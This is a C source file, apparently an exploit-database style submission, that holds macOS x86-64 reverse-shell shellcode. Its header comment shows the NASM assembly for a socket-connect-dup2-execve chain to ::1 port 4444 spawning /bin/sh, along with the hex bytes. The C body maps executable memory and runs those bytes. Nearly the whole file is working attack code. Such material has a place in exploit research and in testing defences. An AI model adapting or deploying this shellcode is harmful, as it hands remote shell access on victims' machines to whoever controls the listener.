/*
# Title:  macOS - Reverse (::1:4444/TCP) Shell (/bin/sh) +IPv6 Shellcode (119 bytes)
# Date:   2019-02-17
# Tested: macOS 10.14.1
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c

dev:works devuser$ sw_vers
ProductName:	Mac OS X
ProductVersion:	10.14.1
BuildVersion:	18B75
dev:works devuser$ cat ipv6rev.s
section .text
global start
start:
    ; socket(AF_INET6, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x1e
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in6 {
    ;         __uint8_t       sin6_len;
    ;         sa_family_t     sin6_family;
    ;         in_port_t       sin6_port;
    ;         __uint32_t      sin6_flowinfo;
    ;         struct in6_addr sin6_addr;
    ;         __uint32_t      sin6_scope_id;
    ; };
    xor  rsi, rsi
    push rsi
    mov  rbx, 0xfeffffffffffffff
    not  rbx
    push rbx
    push rsi
    mov  rsi, 0xffffffffa3eee1e4
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; connect(sockid, &sockaddr, 28)
    mov  rdi, rax
    xor  dl, 0x1c
    mov  rax, r8
    mov  al, 0x62
    syscall

    xor rsi, rsi
    mov sil, 0x3

dup2:
    ; dup2(sockid, 2)
    ;   -> dup2(sockid, 1)
    ;   -> dup2(sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x3b
    syscall
dev:works devuser$ nasm -f macho64 -o ipv6rev.o ipv6rev.s && ld -macosx_version_min 10.7.0 -o ipv6rev ipv6rev.o
dev:works devuser$ for i in $(objdump -d ./ipv6rev.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
\x48\x31\xff\x48\xf7\xe7\x40\xb7\x1e\x48\x31\xf6\x40\xb6\x01\xb0\x02\x48\xc1\xc8\x28\x49\x89\xc0\xb0\x61\x0f\x05\x48\x31\xf6\x56\x48\xbb\xff\xff\xff\xff\xff\xff\xff\xfe\x48\xf7\xd3\x53\x56\x48\xc7\xc6\xe4\xe1\xee\xa3\x48\xf7\xde\x56\x54\x5e\x48\x89\xc7\x80\xf2\x1c\x4c\x89\xc0\xb0\x62\x0f\x05\x48\x31\xf6\x40\xb6\x03\x4c\x89\xc0\xb0\x5a\x40\x80\xee\x01\x0f\x05\x48\x85\xf6\x75\xf0\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x48\x31\xd2\x4c\x89\xc0\xb0\x3b\x0f\x05
dev:works devuser$
*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\x48\x31\xff\x48\xf7\xe7\x40\xb7\x1e\x48\x31\xf6\x40\xb6\x01\xb0\x02\x48\xc1\xc8\x28\x49\x89\xc0\xb0\x61\x0f\x05\x48\x31\xf6\x56\x48\xbb\xff\xff\xff\xff\xff\xff\xff\xfe\x48\xf7\xd3\x53\x56\x48\xc7\xc6\xe4\xe1\xee\xa3\x48\xf7\xde\x56\x54\x5e\x48\x89\xc7\x80\xf2\x1c\x4c\x89\xc0\xb0\x62\x0f\x05\x48\x31\xf6\x40\xb6\x03\x4c\x89\xc0\xb0\x5a\x40\x80\xee\x01\x0f\x05\x48\x85\xf6\x75\xf0\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x48\x31\xd2\x4c\x89\xc0\xb0\x3b\x0f\x05";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}